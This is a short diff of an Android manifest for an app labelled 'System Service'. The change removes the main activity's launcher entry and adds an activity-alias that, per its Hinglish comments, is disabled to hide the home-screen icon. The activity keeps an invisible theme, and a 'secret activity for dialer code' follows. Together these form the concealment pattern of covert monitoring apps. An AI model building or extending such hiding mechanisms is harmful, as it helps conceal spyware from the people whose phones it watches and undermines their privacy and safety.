@@ -57,21 +57,29 @@
 
     <application
         android:allowBackup="false"
-        android:icon="@mipmap/ic_launcher"
+        android:icon="@drawable/ic_launcher"
         android:label="System Service"
         android:theme="@style/Theme.AppCompat"
         android:hardwareAccelerated="true">
 
-        <!-- Main activity -->
+        <!-- Main activity — NO launcher intent filter here -->
         <activity
             android:name=".MainActivity"
             android:exported="true"
-            android:theme="@android:style/Theme.NoDisplay">
+            android:theme="@android:style/Theme.NoDisplay"/>
+
+        <!-- Launcher ALIAS — yeh disable hoga icon hide karne ke liye -->
+        <!-- App Settings mein visible rahegi, sirf home screen se hategi -->
+        <activity-alias
+            android:name=".MainLauncher"
+            android:targetActivity=".MainActivity"
+            android:exported="true"
+            android:enabled="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN"/>
                 <category android:name="android.intent.category.LAUNCHER"/>
             </intent-filter>
-        </activity>
+        </activity-alias>
 
         <!-- Secret activity for dialer code -->
         <activity
